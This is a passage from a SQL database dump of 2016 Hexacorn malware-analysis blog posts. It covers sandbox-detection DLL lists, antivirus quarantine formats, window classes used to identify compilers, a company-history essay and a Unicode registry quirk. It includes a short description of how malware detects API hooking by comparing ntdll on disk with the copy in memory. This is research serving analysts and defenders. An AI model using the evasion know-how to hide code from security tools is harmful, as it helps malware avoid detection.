(WindowBlinds)\nwl_hdlr    Agnitum (Outpost)\nwl_hook    Agnitum (Outpost)\nwpcap    Attempts ot WinPCAP library (possible sandbox detection)\nwpespy    Winsock Packet Editor (WPE)\n\nA separate category is the OS DLLs. The technique that some malware relies on requires loading f.ex. ntdll.dll as a data file, parsing it manually as a PE file, then discovering its exports, finding the code of the API functions that are typically hooked, and eventually comparing that ‘static’ code with the code of the actually loaded library (in memory). This is a trick used by some older packers (AFAIR Themida), but also some custom (and typically advanced, since written in asm most of the time) malware.\nNote: if you use this list in a commercial sandbox, please ensure you give a credit \nShare this :)', 'Batch Analysis, Clustering, Sandboxing', 'http://www.hexacorn.com/blog/2016/07/01/enter-sandbox-part-12-the-library-of-naughty-libraries/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (160, 'Permanent Link to DeXRAY update', 'Hexacorn', 'June 25, 2016 ', 'Added:\n\nESafe (VIR)\nMicrosoft Windows Defender (partial support)\nSpypot – Search & Destroy\n\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ)\nLavasoft AdAware (BDQ) /BitDefender files really/\nMalwareBytes Data files (DATA)\nMalwareBytes Quarantine files (QUAR)\nMcAfee Quarantine files (BUP)\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN)\nSymantec Quarantine Index files (QBI)\nTrendMicro (Magic@0=A9 AC BD A7 which is ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nAny binary file (using X-RAY scanning)\n\nYou can download it here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/06/25/dexray-update-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (161, 'Permanent Link to 5 years of Hexacorn', 'Hexacorn', 'June 24, 2016 ', 'Time flies.\nThe insects that are similar to a common housefly, except a bit nastier. Cuz they offer a pain of a retrospection \nI dedicate this post mainly to younger readers who dream of opening their own company as I will share some lessons learned from the experience of having one. Who knows, maybe it will be helpful to someone.\n\nFirst of all, Hexacorn is a real (‘registered’) company.\nSecondly, my wife and I run it as a part-time hobby/job.\nThirdly, it is profitable. Not in Richard Branson way, but still… it paid for some nice holidays  and the Hex-Rays licenses \n\nLesson #-1.\nThe company needs to be a real deal. If you want your own, start it as a part-time job (unless you are young, and/or rich and into startups)!\nBack in 2009 I wanted to open my own company in UK. We lived there back then and I dreamed of an opportunity to do some work from home using some free cycles I had.\nMy wife and I kept thinking of a name and eventually she came up with ‘hexacorn’ – a neologism or a portmanteau really. The idea being that it’s related to ‘hexa’decimal, and – obviously – uni’corn’s: representing or symbolizing (probably in a certainly pretentious way) the indescribable property of grace, beauty, awe associated with activities related to digging into hexadecimal code and data… be it reversing, programming, forensics, data coding, decoding, data compressing, decompressing, patterns of any sort, entropy, conversions, transformations, visualizations, hacks of any sort, file formats, logs, sandboxing, statistics, packets, bytes, nibbles, bits… basically, anything that makes us all in the DFIR/RCE world tick \nIt’s sometimes called a bug for solving puzzles, investigations or analysis, but fundamentally… a wish to break things apart for the sake of it and pretend that we are actually building something :).\nJust kidding – the real pleasure is the moment you understand ‘what happened on this system’ or ‘how this piece of (malicious, but not only) software works’.\nIt’s a moment of an enlightenment. And very software focused in my case.\nBack to the company. We bought the domain, talked about it for a while, and… we forgot about it cuz I was thinking of changing the job \nI eventually did change it, and in the early 2011 we moved to Hong Kong. After few months the idea to open the company came back, the domain was already there, so the only thing left was to actually register the company.\nLuckily, it’s not my first company I was the owner of (not boasting here, it’s just easier if you have a basic idea how it works and what you need to actually start), so I more or less knew what to expect, but it turned out that Hong Kong is very supportive when it comes to opening the company. It’s a simple, very straightforward process, and not that expensive. If you need any advice, please ping me offline.\nOnce the company was registered, we started waiting for the first customers to appear.\nWe kept waiting.\nRight.\nAfter a few months, our mood sunk and we started to give up.\nEventually I engaged in some sort of ‘marketing’ activities that relied on hard selling my services to a couple of old friends and strangers I could find on Linkedin, and random folk on the intertubes.\nStill, no results.\nThis company thing just didn’t want to fly… \nLesson #0.\nRegistering company != making money. When you are focused on binary, it’s hard for you to be a salesman as well! \nIn the mean time, my wife got a job as a B2B and she started making our first company money. This continued until we left Hong Kong this year, and it was great to see the constant flow of money coming from that single account for a couple of years.\nLesson #1.\nIf you run a company, it’s good to have an account that is long lasting.\nThe concept of an account may be scary, but the reality is that you need to make money. A client paying every month (regularly!) is not only ‘nice to have’. It is a must.\nOn my side, after giving up a bit I got my first ‘hexacorn’ job from a friend who I believe is one of the best in the DFIR industry (he is just keeping a very low profile) and who happens to have his own company – he needed some urgent malware analysis…\nI delivered, then raised my first invoice.\nHappy days!\nLesson #2.\nThe best first customers are most likely people you already know. They may not know you are now a very important businessman. Until you tell them.\nThis relationship continues till today and I am always looking into that guy’s masochistic leadership when it comes to comparison ‘who works harder’ :). He beats me. Every single time :-O.\nAnd no, after my first invoice I didn’t buy Rolls-Royce, or a Jet yet :), but it was very encouraging…\nImagine… someone needed my help & was eager to pay for it!!\nA few months passed, I got a few more gigs from other friends as well… and started making some little money.\nEventually, we closed the fiscal year with a small profit!\nIt felt great!\nLesson #3.\nOnce you start making some money, it feels really satisfying\nI must mention here that the cost of running a company on a side of a regular job is not low.\nI spent a lot of time working at night, and often staying really late to get stuff done quickly, but at the same time at the cost of being a real zombie next day in the office. Being the otaku type didn’t help and I most likely estranged most of the people I worked with…\nNext, when you close the fiscal year… there are costs associated with it. When you register a company you need to do things according to the law, open a business account at the bank, pay for the address /virtual office/, hire accountant, do audit every year, pay annual fee for registration in the Company Registry, and it simply costs… then there is a corporate tax as well, plus if you pay yourself some salary, you need to fill-in a lot of forms for revenue, insurance, pay personal tax, pay for pension, adjust personal tax, etc., then visit various offices every once in a while, and also collect forwarded snail mail, file invoices, vouchers, put them in a chronological order, potentially scan them, and basically… spend a significant number of hours doing the boring admin work!\nYup. It does take hours and days! Do not underestimate the time it takes…\nSo, if you start working independently you need to calculate your consulting fees taking the above into account. When you work for the employer, all these little ‘big’ things are sorted by ‘the other guys’ (other departments). Here, you represent a small company and you have to do it yourself… Or, you face fines, and potentially go to the court \nNot fun if you only want to do binary!!!\nLesson #4.\nWorking on your own, even not full-time is a hell of a challenge… time + formalities != fun\nThe money aspect is important, but the enjoyment of actually doing work as your own boss is quite intoxicating. The time that I didn’t work I invested heavily in developing this blog. Nearly 5 years after I started it (Oct 2011), it is 250+ posts, most of them trying to talk about stuff that (I believe) has never been published before, not necessarily very in-depth, but covering lots of ideas from my [censored] years of toying around with ‘binary’, and data that is often not shared publicly – probably because of their perceived value, or there was no research (at least public) in this space at all (f.ex. list of popular mutexes, atoms, events, etc.).\nAs I say, it’s nothing mind blowing, but the fact I was able to produce so much means actually quite a lot to me. Just imagine, thinking of something, then developing it, is really different from just talking about it. It takes a lot of time, and I can’t even count how many hours the development of this blog took so far.  Believe or not, for some posts, even if appearing rough and just providing relatively short/stripped down data dumps it takes _years_ to gather this data for the release!  Let alone manual editing to exclude the noise of any sort. For example, being a small shop I can’t afford to run a cluster of sandboxes, so I run it all on a single machine! It’s running for 6 years in a row as we speak… And how many things I didn’t publish, because research hours went to /dev/null. Or, because I made a stupid assumption and researched the topic from a wrong angle. And this is not an act of self-appreciation or depreciation here, it’s a hard reality that “thinking” research, and actually converting it into “doing” research, and then writing about it is a very very time-consuming activity. This is why more and more research-hungry guys can only do research for vendors. They need a cozy atmosphere where their research is embraced, encouraged, and actually paid for + they have much bigger resources at hand. Big Data FTW.\nWhen you do it yourself, it just takes away the ‘free time’ you have+costs significant money to maintain (I work with ~60 TB of data scattered amongst a large number of external drives that I had to pay for from my own pocket). Again, not to brag, more to inform that when you are into it – do it for real + actually spend the money. If you are doing it as a part time, it’s even easier, because you already have the full-time salary anyway…\nBack to the time-consuming efforts… this is (I believe) why many blogs of individual researchers don’t last. After few, few dozen posts, people lose their steam, burn out, other things happen in life and they move on. There is also a ‘writing block’, and ‘ideas block’ which hits every once in a while.\nSo far I didn’t hit the wall yet, but I am very self-conscious how volatile my knowledge is, and that the overall know-how in this field is extremely volatile indeed. Only 6-7 years ago no one even thought of having EDR at their disposal, open source timeline and memory analysis tools for all Windows flavors, OS/X, Linux, mobile devices, there was no widely-used Splunk, Elastic Search, IOC standards, threat intel, threat hunting, not even basic information sharing… let’s be honest… even the sense of real community was not there. Today posting IOCs is a norm for many security vendors, and many guys ‘know’ each other from Twitter, various ‘open’, ‘closed’ groups, working in the same company or sector, and of course cons and blogs. It’s actually an awesome community to be a part of. I truly enjoy it.\nAlso, important thing to mention is that a tremendous number of _real_ developers joined the industry – they produce extraordinary results – many tools from not so recent past are no longer used as they have been replaced with real frameworks (volatility, plaso, so many $MFT and Registry and parsing tools (did someone say ‘Eric Zimmerman‘?) for a huge number of artifacts!). It slowly gets to the point where an individual doing research in this field has not enough power to act as a researcher. Seeing vendor reports today one can sense and see that apart from gigantic automation, data mining, collaborative research behind the scenes, they employ a number of the brightest minds in the industry. The DFIR/RCE area slowly becomes commoditized.\nI think it is a good thing. Perhaps a bit scary work-wise, but it does make a huge difference to see the campaign analysis reports today and these produced just a few years back. Or, being able to ‘see’ the endpoint via a console, and see its historical transactions (f.ex. programs ran in last XYZ hours) allowing us to quickly contain an incident. Windows Event logs, Carbon Black logs, historical data… Something that was not present before, or took days to uncover just a few years back….\nBack to the company history…\nOver last few years – mainly through social media – I got to know many folks in this field. There are two personal lessons I took from this online presence: I am not that special, and this thing called DFIR/RCE gets extremely specialized pretty fast and it doesn’t stop to accelerate – a quick exchange with peers often leads to immediate answers, or some new interesting discoveries. We are more and more pressurized to skim over things by the pace of this field! And … to cooperate!\nIt does make me feel uncomfortable at times… How come, I am not the only one thinking of this particular scenario? That, my friend, is ego. Leave it outside the community…\nSo, we should not be afraid to ask and share. You and people you ask will appreciate it!\nLesson #5.\nIf you intend to do research you can’t do it on your own anymore. Sharing is extremely important.\nRight, I was about to talk about the company’s history.\nOne day [don’t ask when, I don’t remember], things changed. I suddenly started getting many various requests from old friends, ex-coworkers, and also complete strangers to help them with software development, reverse engineering, forensic analysis…\nHappy Days #2!\nFor the period of 2013-2014 I worked around the clock, often 12-18h a day. And this is not a hyperbole. When you get billable hours… you get crazy, consumed by the prospect of working on superinteresting stuff, learning extremely quickly new skills, making a buck of course, and you do everything to make everyone who wants your services… just happy… I established some good relationships and am really feeling privileged to be working with some of the best minds in this field. I also learnt new skills, and unlearnt some others, basically… made myself better at what I do. I hope.\nLesson #6.\nThe road to success is paved with working at night, all-nighters and lots of a weekend work & lots of … humility\nAt the end of 2014 some sad event happened in my family, followed by another one in May 2015 \nThis was sort of wake-up call for me and I significantly slowed down. I reduced my workload and pretty much moved to work only with the closest friends and on the most interesting (from my perspective) stuff. I dedicated 2015 year to relaxing, and splurging and me and my wife traveled a lot that year. It was a tough year (this may sound awkward, but grief needs time and despite traveling it took a long time to recover…).\nBy the end of 2015 we decided to move back to UK and we did that in January 2016.\nLesson #7.\nWork is not everything, and work takes you places. Find time for a reflection\nNow, in UK, I am considering my next steps. I am sometimes tempted to take more work, I am also tempted to simply get old spending time with my wife, and reading more ‘real’ paper books. The Brexit just happened and it’s yet another big unknown…\nWhat happens next is an interesting conundrum – probably shared by many of us in the DFIR/RCE community. We are in the middle of ‘developing’ a fully managed service called Incident Preparedness, Response and Management that will surely will be taken over by large companies at some stage; just wait for it; something that a few years later we will take for granted.\nBUT\n5 years later I can confess that I still love doing what I do @ hexacorn. I hope I didn’t piss off too many people over the years. This experience made me actually very humble. Stepping out of a frog’s well and so-called comfort zone is an important development, both professional and personal (if you consider yourself a geek, try it!). Even if I struggle with a backlog of blogs, posts, unanswered emails, and paper books that I want to read – after so many years that hexadecimal unicornish awe is still with me and I hope this will accompany me for many years to come. If given the same chances, I’d defo do it again.\nAnd as I already know, sometimes it will pay for some new holidays \nGreetz\nThis blog is small yet it received a bit of attention over the years. I can’t count how many people I need to thank for it. There are guys from various companies, training orgs, independent researchers, authors of books (thx for referring to my blog!), reversers, forensic specialists, some of my managers who I was really lucky to have as great mentors, ex-coworkers, and most importantly – my wife who is supporting this work wholeheartedly.\nI won’t name specific names, but you know who you are. This community is very special and being a part of it is a blessing. I truly mean that.\nThank you for reading, have a good weekend and hope to see us all here 5 years from now!\nAdam@Hexacorn\np.s. If you need some part-time RCE/DFIR help. Ping me \np.s.2. If you want to read more on the topic of consulting/company read Hal Pomeran’s Consulting-part-1-the-case-for-consulting\nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2016/06/24/5-years-of-hexacorn/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (162, 'Permanent Link to Certain Windows… stay classy…', 'Hexacorn', 'June 22, 2016 ', 'Update 2016-07-08\nAdded Thinstall applications\nOld post\nAn ability to determine the compiler used to compile a binary is quite important. It determines the way we approach the reversing session and automatically tells us what tools to use. There are many static analysis tools available that help with the determination of the compiler/linker/protector used to build a specific binary.\nSometimes it may not be enough though.\nIn this post I will list a number of windows-related artifacts created by various programming frameworks that may help us to determine what is the payload compiled with. While there are many of such frameworks many of them rely on a very fixed number of more-or-less hidden windows, or window classes that stay persistent across many versions of the framework, or are created at some point in time.\nThis is by no means an exhaustive list – if you have anything to add, or find a mistake, I will appreciate the feedback.\nNote: such list may be used for many purposes:\n\ncompiler/protector determination\ndata reduction (from strings, or f.ex. strings recognition in IDA, if it itself failed to do so well)\nclassification (whitelisting/blacklisting) of the sandboxes samples\ninstaller discovery in sandbox analysis (may trigger a different handling routine f.ex. if Auto It is detected, or any installer, low-level logging may be disabled until the actual autoir / installer script starts execution, etc.)\n\nHere’s the list I gathered:\nVisual Basic\n\nThunderRT6Main\nVBMsoStdCompMgr\nVBFocusRT6 (this is from Visual Basic 6.0)\nVBBubbleRT6 (this is from Visual Basic 6.0)\nVBFocusRT5 (this is from Visual Basic 5.0)\nVBBubbleRT5 (this is from Visual Basic 5.0)\n\nVisual Basic .NET\n\nVBNetStudio\n\nMFC (Microsoft Foundation Classes/Application Framework Extensions)\n\nAfx:<hexadecimal number>:<hexadecimal number> f.ex. ‘Afx:400000:0’ or ‘Afx:10000000:0’\nAfx:StatusBar:<hexadecimal number> f.ex. ‘Afx:StatusBar:400000’\nAfx:TabWnd:<hexadecimal number> f.ex. ‘Afx:TabWnd:400000’\nAfx:ToolBar:<hexadecimal number> f.ex. ‘Afx:ToolBar:400000’\n\nQT\n\nQt5QWindowIcon\n\nInstaller: Install Shield \n\nGLBSInstall\nInstallShield_Win\n\nInstaller: Inno Setup\n\n\nclass name: STATIC, window name: InnoSetupLdrWindow\n\nEnigma Protector (not confirmed)\n\nTEnigmaProtectorLoaderButton\nTEnigmaProtectorLoaderEdit\nTEnigmaProtectorLoaderFormMessage\nTEnigmaProtectorLoaderFormRegistration\nTEnigmaProtectorLoaderGroupBox\n\nRunDll32 execution\n\nRunDLL\n\nOLE/DDE Windows\n\nOleMainDdeClass\n\nAutoIt\n\nAutoIt v3\nAutoIt v3 GUI\nAu3Info\nAutoIt\nAutoIt – Splash\n\nStandard Windows controls\n\nComboBoxEx32\ncommctrl_DragListMsg\nmsctls_hotkey32\nmsctls_progress32\nmsctls_statusbar32\nmsctls_trackbar32\nmsctls_updown32\nNativeFontCtl\nReBarWindow32\nRichEdit\nRichEdit20a\nSysAnimate32\nSysDateTimePick32\nSysHeader32\nSysIPAddress32\nSysListView32\nSysMonthCal32\nSysPager\nSysTabControl32\nSysTreeView32\nToolbarWindow32\ntooltips_class32\n\nThinstall applications\n\nThStatusBarCtrlClass\n\nOthers\n\nmdiclient (typical class name for MDI /Multiple Document Interface/)\n\nAnd last, but not least, a ‘gallery’ of classes from a number of dynamically analyzed samples written in\nBorland/Delphi/etc. \n\nTAbout\nTAboutBox\nTAboutBox1\nTAboutDlg\nTAboutForm\nTAboutFrm\nTActionMainMenuBar\nTActionToolBar\nTActivationForm\nTAdminForm\nTAdvGlassButton\nTAdvGlowButton\nTAdvListView\nTAdvMemo\nTAdvOfficePage\nTAdvOfficePager\nTAdvOfficeStatusBar\nTAdvPageControl\nTAdvProgress\nTAdvSmoothButton\nTAdvSmoothPanel\nTAdvSpinEdit\nTAdvTabSheet\nTAdvToolBar\nTAfterScan\nTAnimate\nTAnPane\nTAppBuilder\nTApplication\nTBitBtn\nTBrowserDlg\nTBrowserForm\nTButton\nTButton2\nTButtonGroup\nTCalc\nTCalculator\nTCancelScan\nTCategoryPanelGroup\nTCentral\nTChart\nTChat\nTChatWindow\nTCheckBox\nTCheckListBox\nTClient\nTClientForm\nTCloseForm\nTCodePanel\nTColorBox\nTColorButton\nTColorGrid\nTColorWindow\nTComboBox\nTComboBoxEx\nTComComboBox\nTConerBtn\nTConfigForm\nTConfigServer\nTControlForm\nTControllerForm\nTCoolBar\nTCpanel\nTCustomDateTimePicker\nTDateTimePicker\nTDebugForm\nTDesco\nTDirectoryListBox\nTDragArrow\nTDrawGrid\nTDriveComboBox\nTDsGroupBox\nTEdit\nTEdit97\nTEditForm\nTEditListBox\nTEditN\nTEdits\nTEnvWindow\nTError\nTExeToolForm\nTEzHelpWindow\nTFashionPanel\nTFileListBox\nTFinalFantasy\nTFinalPws\nTFlatButton\nTFlatCheckBox\nTFlatComboBox\nTFlatEdit\nTFlatGroupBox\nTFlatPanel\nTFlatRadioButton\nTFlatSpinEditInteger\nTFlatTitlebar\nTFmMain\nTFmPrincipal\nTForm\nTForm0\nTForm1\nTForm1.UnicodeClass\nTForm10\nTForm100\nTForm101\nTForm102\nTForm103\nTForm104\nTForm105\nTForm106\nTForm107\nTForm108\nTForm109\nTForm11\nTForm110\nTForm111\nTForm112\nTForm113\nTForm114\nTForm115\nTForm116\nTForm117\nTForm118\nTForm119\nTForm12\nTForm120\nTForm121\nTForm122\nTForm123\nTForm124\nTForm125\nTForm126\nTForm127\nTForm128\nTForm129\nTForm13\nTForm130\nTForm131\nTForm132\nTForm133\nTForm134\nTForm135\nTForm136\nTForm137\nTForm138\nTForm139\nTForm14\nTForm140\nTForm141\nTForm142\nTForm143\nTForm144\nTForm145\nTForm146\nTForm147\nTForm148\nTForm149\nTForm15\nTForm150\nTForm151\nTForm152\nTForm153\nTForm154\nTForm155\nTForm156\nTForm157\nTForm158\nTForm159\nTForm16\nTForm160\nTForm161\nTForm162\nTForm163\nTForm164\nTForm165\nTForm166\nTForm167\nTForm168\nTForm169\nTForm17\nTForm170\nTForm171\nTForm172\nTForm173\nTForm174\nTForm175\nTForm176\nTForm177\nTForm178\nTForm179\nTForm18\nTForm180\nTForm181\nTForm182\nTForm183\nTForm184\nTForm185\nTForm186\nTForm187\nTForm188\nTForm189\nTForm19\nTForm190\nTForm191\nTForm192\nTForm193\nTForm194\nTForm195\nTForm196\nTForm197\nTForm198\nTForm199\nTForm1a\nTForm1b\nTForm1c\nTForm1w\nTForm2\nTForm20\nTForm200\nTForm201\nTForm202\nTForm203\nTForm204\nTForm205\nTForm206\nTForm207\nTForm208\nTForm209\nTForm21\nTForm210\nTForm211\nTForm212\nTForm213\nTForm214\nTForm215\nTForm216\nTForm217\nTForm218\nTForm219\nTForm22\nTForm220\nTForm221\nTForm222\nTForm223\nTForm224\nTForm225\nTForm226\nTForm227\nTForm228\nTForm229\nTForm23\nTForm230\nTForm231\nTForm232\nTForm233\nTForm234\nTForm235\nTForm236\nTForm237\nTForm238\nTForm239\nTForm24\nTForm240\nTForm241\nTForm242\nTForm243\nTForm244\nTForm25\nTForm26\nTForm27\nTForm28\nTForm29\nTForm2a\nTForm2b\nTForm3\nTForm30\nTForm31\nTForm32\nTForm33\nTForm34\nTForm35\nTForm36\nTForm37\nTForm38\nTForm39\nTForm3a\nTForm3b\nTForm4\nTForm40\nTForm41\nTForm42\nTForm43\nTForm44\nTForm45\nTForm46\nTForm47\nTForm48\nTForm49\nTForm4c\nTForm4d\nTForm5\nTForm50\nTForm51\nTForm52\nTForm53\nTForm54\nTForm55\nTForm56\nTForm57\nTForm58\nTForm59\nTForm5a\nTForm6\nTForm60\nTForm61\nTForm62\nTForm63\nTForm64\nTForm65\nTForm66\nTForm67\nTForm68\nTForm69\nTForm6a\nTForm6b\nTForm7\nTForm70\nTForm71\nTForm72\nTForm73\nTForm74\nTForm75\nTForm76\nTForm77\nTForm78\nTForm79\nTForm7w\nTForm8\nTForm80\nTForm81\nTForm82\nTForm83\nTForm84\nTForm85\nTForm86\nTForm87\nTForm88\nTForm89\nTForm9\nTForm90\nTForm91\nTForm92\nTForm93\nTForm94\nTForm95\nTForm96\nTForm97\nTForm98\nTForm99\nTForm_About\nTForm_Main\nTForm_Options\nTForm_Principal\nTForm_splash\nTForm_Undelete\nTForm_Update\nTFormAbout\nTFormaTudo\nTFormAutorun\nTFormbb\nTFormCreateServer\nTFormDisclaimer\nTFormExit\nTFormHTML\nTForminfo\nTFormInstaller\nTFormLogin\nTFormMain\nTFormOptions\nTFormp\nTFormPasswords\nTFormPrinc\nTFormPrincipal\nTFormProgress\nTFormregister\nTFormRunning\nTFormSetup\nTFormShell\nTFormSlectDir\nTFormSplash\nTFormUpdate\nTFormWait\nTFormWeb\nTFormwebbrowser\nTFormXInstaller\nTFrame1\nTFrame4\nTFrame6\nTFrm_check\nTFrm_codigo\nTFrm_Main\nTFrmAbout\nTFrmAd\nTFrmAgree\nTFrmBrad\nTFrmCert\nTFrmChat\nTFrmControl\nTFrmDownAgree\nTFrmDownload\nTFrmECleanDel\nTFrmExport\nTFrmGF\nTFrmIDSoc\nTFrmInit\nTFrmLogin\nTFrmMain\nTFrmNewAccount\nTFrmPass\nTFrmPassw\nTFrmPrincipal\nTFrmReflet\nTFrmSeting\nTFrmSetup\nTFrmSplash\nTFrmSynNglp\nTFrmTOKEN1\nTFrmUpdate\nTFrmVrfcdr\nTFunc\nTGeoPosition\nTGradBtn\nTGradPan\nTGroupBox\nTGroupButton\nTHeader\nTHelpForm\nTHiddenForm\nTHintWindow\nTHotButton\nTHotGroupBox\nTHotKey\nTHtmlUIForm\nTImageForm\nTInfobusca\nTInfoForm\nTInplaceEdit\nTInstallerForm\nTInstallForm\nTKeyForm\nTKeygenForm\nTLabel\nTLabeledEdit\nTLayerWindow\nTLinkLabel\nTLinkText\nTListBox\nTListenForm\nTListView\nTLogForm\nTLogin\nTLogin_Form\nTLoginForm\nTLogo\nTLogoForm\nTLogonDlg\nTLogonForm\nTMain\nTMain_Form\nTMainF\nTMainF0rmVer2\nTMainFM\nTMainForm\nTMainFormVer2\nTMainFrm\nTMainMPRForm\nTMainWin\nTMainWindow\nTManForm\nTMaskEdit\nTMaster\nTMediaPlayer\nTMemo\nTMemoForm\nTMenuButton\nTMessageForm\nTModifiedEdit\nTMonitor\nTMonitorForm\nTMonthCalendar\nTMormay1\nTMsgForm\nTMsgForm2\nTMyIEButton2\nTNetComMainFm\nTNetWindow\nTNewButton\nTNewCheckListBox\nTNewComboBox\nTNewDiskForm\nTNewMemo\nTNewNotebook\nTNewNotebookPage\nTNewRadioButton\nTNewStaticText\nTNewWindow\nTNextGrid\nTNomeDiferente\nTNotebook\nTNotifierWindow\nTNotifyForm\nTNxButton\nTNxPopupList\nTNxTabSheet\nTOleContainer\nTOptionsForm\nTOutline\nTOvcfrmSplashDlg\nTPage\nTPageControl\nTPageScroller\nTPainel_Seguranca\nTPainel_Seguranca2\nTPanel\nTPanels\nTParentForm\nTPasswordDlg\nTPasswordForm\nTPenWindow2\nTPlanilha\nTPlayForm\nTPlaylistForm.UnicodeClass\nTPngBitBtn\nTPoolTemplate\nTPortRedirForm\nTPreviewWindow\nTPrincipal\nTPrnStatusForm\nTProcessForm\nTProgressBar\nTProgressForm\nTPromoForm\nTPserver\nTPwdForm\nTRadioButton\nTRadioGroup\nTRbButton\nTReg_Form\nTRegForm\nTRegHex\nTRegisterForm\nTRegistrationWindow\nTRichEdit\nTRichEditViewer\nTRollShadow\nTRum_\nTRunningText\nTRzBitBtn\nTRzBmpButton\nTRzButton\nTRzButtonEdit\nTRzButtonPair\nTRzCheckBox\nTRzComboBox\nTRzEdit\nTRzGroup\nTRzGroupBox\nTRzGroupButton\nTRzMaskEdit\nTRzPageControl\nTRzPanel\nTRzRadioButton\nTRzRadioGroup\nTRzSizePanel\nTRzSpinButtons\nTRzSpinEdit\nTRzSplitter\nTRzTabSheet\nTRzToolbar\nTSbookF\nTScrollBar\nTScrollBox\nTScroller\nTSecCenter\nTSechDir\nTSelectLanguageForm\nTSelectWindow\nTServerForm\nTSetForm\nTSettingsForm\nTSetupForm\nTSetupMainForm\nTShellTreeView\nTShowPm\nTSiInMay\nTSkin\nTSpinButton\nTSpinEdit\nTSpinEdit2\nTSplash\nTSplashForm\nTSplashScreen\nTStaticText\nTStatusBar\nTStatusForm\nTStoringComboBox\nTStringGrid\nTStubForm\nTSupervisor\nTSynBaseCompletionProposalForm\nTSynMemo\nTSystemUpdateService\nTTabControl\nTTabPage\nTTabSet\nTTabSheet\nTTabSheetes\nTTeButton\nTTeCustomTabSheet\nTTePanel\nTTeSEdit\nTTestForm\nTTeTabSheet\nTTetro1\nTTipForm\nTToolBar\nTToolbar97\nTTrackBar\nTTransEdit\nTTransMemo\nTTreeView\nTTurcaButton\nTUnidadU\nTUnzipPanel\nTUpdateForm\nTUpdateFrm\nTUpDown\nTUpIpDate\nTVeeImageButton\nTVideoWindow\nTViewForm\nTVrDemoButton\nTWaitForm\nTWarningForm\nTWelcome\nTWinApiWnd\nTWinControl\nTWindowDisabler-Window\nTWinForm\nTWinMain\nTWizardForm\nTWizButton\nTWizDropDownPanel\nTWnForm\n\nShare this :)', 'Batch Analysis, Clustering, Forensic Analysis, Malware Analysis, Reversing, Sandboxing', 'http://www.hexacorn.com/blog/2016/06/22/certain-windows-stay-classy/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (163, 'Permanent Link to Enter Sandbox – part 11: Breaking the sandbox, literally :)', 'Hexacorn', 'June 10, 2016 ', 'My homemade VMs run on VMWare. I use it for a number of years now and is my preference as it’s very fast (especially on SSD), configuration is very flexible, the management of snapshots is very user-friendly and in general – I am really happy with it.\nI use VMWare to run some of automated malware analysis too and with nearly 1 million files processed there are occasions when it breaks.\nI would be really curious to know what is the failure ratio for the commercial sandboxes, but I would imagine this must be happening quite a bit, given the volume of samples they process. I guess it’s probably one of the best stress tests for VMs – the code ran in a malware sandbox does a lot of funny stuff and is written by gazillions of clever programmers. There is a huge variety of code, data, errors, undocumented tricks, etc. – I bet some researchers already do it, but I would imagine this could be a good way to automate fuzzing of the VM software in order to find VM escapes.\nIn any case, since this post falls under ‘Enter sandbox’ series, it’s actually just a quickie dedicated to the dialog boxes that every once in a while kill my batch processing \n\n\n\n\n\n\n\n\n \n \nShare this :)', 'Sandboxing, Silly', 'http://www.hexacorn.com/blog/2016/06/10/enter-sandbox-part-11-breaking-the-sandbox-literally/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (164, 'Permanent Link to Minor update to 3R', 'Hexacorn', 'June 8, 2016 ', 'Just updated 3R to include the latest snapshot from https://github.com/keydet89/RegRipper2.8.\n \nShare this :)', '3R, Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2016/06/08/minor-update-to-3r/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (165, 'Permanent Link to Win10, Registry, and fun with UCS/UTF16', 'Hexacorn', 'June 7, 2016 ', 'We got so used to ‘see’ Unicode strings as being made up of characters that occupy 2-bytes that we often forget that it’s actually not true – using 2 bytes is just a convenient way to represent most of the common characters, but the standard allows us to use characters that are outside of that 16-bit spectrum. To represent them it uses sth called high- and low- surrogates:\nAs per https://en.wikipedia.org/wiki/Universal_Character_Set_characters:\nSurrogates. The UCS includes 2,048 code points in the Basic Multilingual Plane (BMP) for surrogate code point pairs. Together these surrogates allow any code point in the sixteen other planes to be addressed by using two surrogate code points. This provides a simple built-in method for encoding the 20.1 bit UCS within a 16 bit encoding such as UTF-16. In this way UTF-16 can represent any character within the BMP with a single 16-bit byte. Characters outside the BMP are then encoded using two 16-bit bytes (4 octets total) using the surrogate pairs.\nWhy I am writing about it?\nI just stumbled upon a Registry key that is using the 4-byte long Unicode Characters in Windows 10 ;):\nHKEY_USERS\\.DEFAULT\\Control Panel\\International\\\n\nIt looks like a gimmick, and someone probably had a bit of fun implementing it, but this is actually a legitimate entry being queried when Windows starts!\n\nThe characters are (by their binary representation):\n\n3C D8 0E DF\n\n0xD83C 0xDF0E http://www.fileformat.info/info/unicode/char/1F30E/index.htm\n\n\n3C D8 0F DF\n\n0xD83C 0xDF0F http://www.fileformat.info/info/unicode/char/1f30f/index.htm\n\n\n3C D8 0D DF\n\n0xD83C 0xDF0D http://www.fileformat.info/info/unicode/char/1F30D/index.htm\n\n\n\nI wonder what could be impacted by the “Unicode string=16-bit characters” assumption:\n\nI guess not all tools may support UCS properly\n\nif they assume Unicode is 16-bit/use their own parsers w/o taking into account surrogates (I am guilty as charged, I 